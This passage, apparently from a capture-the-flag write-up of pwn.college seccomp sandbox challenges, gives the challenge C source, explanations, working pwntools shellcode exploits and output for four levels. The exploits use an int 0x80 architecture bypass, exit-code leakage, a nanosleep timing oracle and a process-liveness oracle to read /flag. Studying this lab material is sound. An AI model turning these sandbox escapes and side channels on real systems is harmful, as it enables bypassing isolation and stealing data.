    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: allow).\n");
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    for (int i = 0; i < 512; i++)
    {
        switch (i)
        {
        case SCMP_SYS(close):
            printf("Allowing syscall: %s (number %i).\n", "close", SCMP_SYS(close));
            continue;
        case SCMP_SYS(stat):
            printf("Allowing syscall: %s (number %i).\n", "stat", SCMP_SYS(stat));
            continue;
        case SCMP_SYS(fstat):
            printf("Allowing syscall: %s (number %i).\n", "fstat", SCMP_SYS(fstat));
            continue;
        case SCMP_SYS(lstat):
            printf("Allowing syscall: %s (number %i).\n", "lstat", SCMP_SYS(lstat));
            continue;
        }
        assert(seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0);
    }

    puts("Adding architecture to seccomp filter: x86_32.\n");
    seccomp_arch_add(ctx, SCMP_ARCH_X86);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

This time, the rules are defined, and then the architecture `SCMP_ARCH_X86` is added.

```c title="/challenge/babyjail_level9.c" showLineNumbers
# ---- snip ----

    ctx = seccomp_init(SCMP_ACT_ALLOW);
    for (int i = 0; i < 512; i++)
    {
        switch (i)
        {
        case SCMP_SYS(close):
            printf("Allowing syscall: %s (number %i).\n", "close", SCMP_SYS(close));
            continue;
        case SCMP_SYS(stat):
            printf("Allowing syscall: %s (number %i).\n", "stat", SCMP_SYS(stat));
            continue;
        case SCMP_SYS(fstat):
            printf("Allowing syscall: %s (number %i).\n", "fstat", SCMP_SYS(fstat));
            continue;
        case SCMP_SYS(lstat):
            printf("Allowing syscall: %s (number %i).\n", "lstat", SCMP_SYS(lstat));
            continue;
        }
        assert(seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0);
    }

    puts("Adding architecture to seccomp filter: x86_32.\n");
    seccomp_arch_add(ctx, SCMP_ARCH_X86);

# ---- snip ----
```

As a result of adding the x86 architecture after adding the rules, the rules are applied to the default x86-64 architecture and no x86.

We can exploit this by swithing out `syscall` with `int 0x80`, and 

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode = asm(r"""
    /* open("/flag", O_RDONLY) */
    lea rbx, [rip + flag]
    xor ecx, ecx
    mov eax, 5              /* sys_open */
    int 0x80

    /* read(fd, buf, 0x100) */
    mov ebx, eax
    lea rcx, [rip + buf]
    mov edx, 0x100
    mov eax, 3              /* sys_read */
    int 0x80

    /* write(1, buf, 0x100) */
    mov ebx, 1
    lea rcx, [rip + buf]
    mov edx, 0x100
    mov eax, 4              /* sys_write */
    int 0x80

flag:
    .ascii "/flag"

buf:
    .space 0x100
""")

p = process("/challenge/babyjail_level9")
p.send(shellcode)
p.interactive()
```

```
hacker@sandboxing~seccomp-arch32:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level9!
###

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 8d 1d 36 00 00 00                          | lea rbx, [rip + 0x36]
0x0000000001337007 | 31 c9                                         | xor ecx, ecx
0x0000000001337009 | b8 05 00 00 00                                | mov eax, 5
0x000000000133700e | cd 80                                         | int 0x80
0x0000000001337010 | 89 c3                                         | mov ebx, eax
0x0000000001337012 | 48 8d 0d 2a 00 00 00                          | lea rcx, [rip + 0x2a]
0x0000000001337019 | ba 00 01 00 00                                | mov edx, 0x100
0x000000000133701e | b8 03 00 00 00                                | mov eax, 3
0x0000000001337023 | cd 80                                         | int 0x80
0x0000000001337025 | bb 01 00 00 00                                | mov ebx, 1
0x000000000133702a | 48 8d 0d 12 00 00 00                          | lea rcx, [rip + 0x12]
0x0000000001337031 | ba 00 01 00 00                                | mov edx, 0x100
0x0000000001337036 | b8 04 00 00 00                                | mov eax, 4
0x000000000133703b | cd 80                                         | int 0x80

Restricting system calls (default: allow).

Allowing syscall: close (number 3).
Allowing syscall: stat (number 4).
Allowing syscall: fstat (number 5).
Allowing syscall: lstat (number 6).
Adding architecture to seccomp filter: x86_32.

Executing shellcode!

pwn.college{M80kEnO9vG-P8JeppC9G9QZibAn.0VOzIDL4ITM0EzW}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$  
```

&nbsp;

## seccomp-minimal

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read", "exit"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!

```c title="/challenge/babyjail_level10.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "exit", SCMP_SYS(exit));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

This challenge opens the file / directory that we pass as an argument.

```c title="/challenge/babyjail_level5.c" showLineNumbers
# ---- snip ----

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

# ---- snip ----
```

### Leaking flag bytes using `exit`

Linux lets a process exit with an 8-bit status code.
We can pass each byte of the flag as the exit code in order to leak the flag.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

flag = b""

BUF = 0x1337800

for i in range(100):

    shellcode = asm(f"""
        /* read(3, buf, 0x100) */
        mov rdi, 3
        mov rsi, {BUF}
        mov rdx, 0x100
        xor eax, eax
        syscall

        /* exit(flag[i]) */
        movzx edi, byte ptr [{BUF} + {i}]
        mov eax, 60
        syscall
    """)

    p = process([
        "/challenge/babyjail_level10",
        "/flag"
    ])

    p.send(shellcode)
    p.wait()

    code = p.poll()

    if code < 0:
        print(f"process died with signal {-code}")
        break

    if code == 0:
        break

    flag += bytes([code])
    print(flag.decode(errors="ignore"))

print("\nFLAG:", flag.decode(errors="ignore"))
```

```
hacker@sandboxing~seccomp-minimal:~$ python ~/script.py
p
pw
pwn
pwn.
pwn.c
pwn.co
pwn.col
pwn.coll
pwn.colle
pwn.colleg
pwn.college
pwn.college{
pwn.college{0
pwn.college{0u
pwn.college{0uX
pwn.college{0uXf
pwn.college{0uXfo
pwn.college{0uXfoz
pwn.college{0uXfozp
pwn.college{0uXfozp4
pwn.college{0uXfozp4e
pwn.college{0uXfozp4ef
pwn.college{0uXfozp4efR
pwn.college{0uXfozp4efRY
pwn.college{0uXfozp4efRYC
pwn.college{0uXfozp4efRYCq
pwn.college{0uXfozp4efRYCq_
pwn.college{0uXfozp4efRYCq_1
pwn.college{0uXfozp4efRYCq_1K
pwn.college{0uXfozp4efRYCq_1KH
pwn.college{0uXfozp4efRYCq_1KHu
pwn.college{0uXfozp4efRYCq_1KHu3
pwn.college{0uXfozp4efRYCq_1KHu35
pwn.college{0uXfozp4efRYCq_1KHu355
pwn.college{0uXfozp4efRYCq_1KHu3550
pwn.college{0uXfozp4efRYCq_1KHu3550o
pwn.college{0uXfozp4efRYCq_1KHu3550oG
pwn.college{0uXfozp4efRYCq_1KHu3550oGX
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0F
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0I
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0ID
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4I
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4IT
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0E
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0Ez
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0EzW
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0EzW}
pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0EzW}


FLAG: pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0EzW}
```

&nbsp;

## seccomp-timebased

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!

```c title="/challenge/babyjail_level11.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "nanosleep", SCMP_SYS(nanosleep));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(nanosleep), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

### Leaking flag bytes using `nanosleep`

For every flag position (idx), we can try characters:

```py
for c in charset:
```

Suppose:

```py
flag[idx] == 'p'
```

Then shellcode compares:

```asm
mov al, byte ptr [BUF + idx]
cmp al, guess
```

Then we have two options based on the result of the comparison:
1. If the characters are the same, we can sleep for a certain amount of time.
2. If the characters are not the same, we can crash the program.


### Exploit

```py title="" showLineNumbers
from pwn import *
import time
import string

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

BUF = 0x1337800

flag = b""

charset = string.ascii_letters + string.digits + "{}._-"

for idx in range(128):

    for c in charset:

        guess = ord(c)

        shellcode = asm(f"""
            /* read(3, BUF, 0x100) */
            mov rdi, 3
            mov rsi, {BUF}
            mov rdx, 0x100
            xor eax, eax
            syscall

            /* compare flag[idx] */
            mov al, byte ptr [{BUF} + {idx}]
            cmp al, {guess}
            jne crash

            /* nanosleep(&ts, NULL) */
            lea rdi, [rip + ts]
            xor esi, esi
            mov eax, 35
            syscall

        crash:
            mov rax, [0]

        ts:
            .quad 1
            .quad 0
        """)

        start = time.time()

        p = process([
            "/challenge/babyjail_level11",
            "/flag"
        ])

        p.send(shellcode)
        p.wait()

        elapsed = time.time() - start

        p.close()

        if elapsed > 0.8:

            flag += bytes([guess])

            print(flag.decode())

            if c == "}":
                print("\nFLAG:", flag.decode())
                exit()

            break
```

```
hacker@sandboxing~seccomp-timebased:~$ python ~/script.py
p
pw
pwn
pwn.
pwn.c
pwn.co
pwn.col
pwn.coll
pwn.colle
pwn.colleg
pwn.college
pwn.college{
pwn.college{s
pwn.college{sJ
pwn.college{sJM
pwn.college{sJMI
pwn.college{sJMIl
pwn.college{sJMIlS
pwn.college{sJMIlSD
pwn.college{sJMIlSDb
pwn.college{sJMIlSDbC
pwn.college{sJMIlSDbCV
pwn.college{sJMIlSDbCV5
pwn.college{sJMIlSDbCV5i
pwn.college{sJMIlSDbCV5i1
pwn.college{sJMIlSDbCV5i1l
pwn.college{sJMIlSDbCV5i1li
pwn.college{sJMIlSDbCV5i1li7
pwn.college{sJMIlSDbCV5i1li7B
pwn.college{sJMIlSDbCV5i1li7B7
pwn.college{sJMIlSDbCV5i1li7B7r
pwn.college{sJMIlSDbCV5i1li7B7rz
pwn.college{sJMIlSDbCV5i1li7B7rzq
pwn.college{sJMIlSDbCV5i1li7B7rzqa
pwn.college{sJMIlSDbCV5i1li7B7rzqaN
pwn.college{sJMIlSDbCV5i1li7B7rzqaNT
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTq
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0V
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0I
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0ID
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4I
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4IT
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0E
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0Ez
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0EzW
pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0EzW}

FLAG: pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0EzW}
```

&nbsp;

## seccomp-readonly

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!

```c title="" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

This challenge only allows the `read` syscall. The program opens the file passed in `argv[1]` before enabling `seccomp`, so `/flag` is already available to us on fd `3`.

Since write, exit, and nanosleep are blocked, we need another side channel. The approach here is to distinguish between:
- a process that is still alive
- a process that was killed by `seccomp`

The shellcode reads the flag into memory and compares one byte against a guessed character.

If the guess is correct, the shellcode enters an infinite loop:

```asm
loop:
    jmp loop
```

If the guess is wrong, it executes a forbidden syscall:

```asm
mov eax, 60
syscall
```

Since `exit` is not allowed, `seccomp` immediately kills the process.

The parent Python script simply checks:

```py
p.poll() is None
```

If the process is still running, the guessed byte was correct. Otherwise, the guess was wrong.

### Exploit

```py title="" showLineNumebers
from pwn import *
import string
import time

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

BUF = 0x1337800

flag = b""

charset = string.ascii_letters + string.digits + "{}._-"

for idx in range(128):

    found = False

    for c in charset:

        guess = ord(c)

        shellcode = asm(f"""
            mov rdi, 3
            mov rsi, {BUF}
            mov rdx, 0x100
            xor eax, eax
            syscall

            mov al, byte ptr [{BUF}+{idx}]
            cmp al, {guess}
            jne wrong

        loop:
            jmp loop

        wrong:
            mov eax, 60
            syscall
        """)

        p = process([
            "/challenge/babyjail_level12",
            "/flag"
        ])

        p.send(shellcode)

        time.sleep(0.1)

        # still running => correct guess
        if p.poll() is None:

            p.kill()

            flag += c.encode()

            print(flag.decode())

            found = True

            if c == "}":
                print("\nFLAG:", flag.decode())
                exit()

            break

        p.close()

    if not found:
        print("failed")
        break
```

```
hacker@sandboxing~seccomp-readonly:~$ python ~/script.py
p
pw
pwn
pwn.
pwn.c
pwn.co
pwn.col
pwn.coll
pwn.colle
pwn.colleg
pwn.college
pwn.college{
pwn.college{c
pwn.college{cg
pwn.college{cgx
pwn.college{cgxP
pwn.college{cgxPi
pwn.college{cgxPiI
pwn.college{cgxPiIo
pwn.college{cgxPiIoJ
pwn.college{cgxPiIoJT
pwn.college{cgxPiIoJTF
pwn.college{cgxPiIoJTF-
pwn.college{cgxPiIoJTF-5
pwn.college{cgxPiIoJTF-53
pwn.college{cgxPiIoJTF-53P
pwn.college{cgxPiIoJTF-53P0
pwn.college{cgxPiIoJTF-53P0g
pwn.college{cgxPiIoJTF-53P0gY
pwn.college{cgxPiIoJTF-53P0gY7
pwn.college{cgxPiIoJTF-53P0gY72
pwn.college{cgxPiIoJTF-53P0gY72L
pwn.college{cgxPiIoJTF-53P0gY72Ld
pwn.college{cgxPiIoJTF-53P0gY72LdI
pwn.college{cgxPiIoJTF-53P0gY72LdIZ
pwn.college{cgxPiIoJTF-53P0gY72LdIZN
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7L
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0l
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0I
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0ID
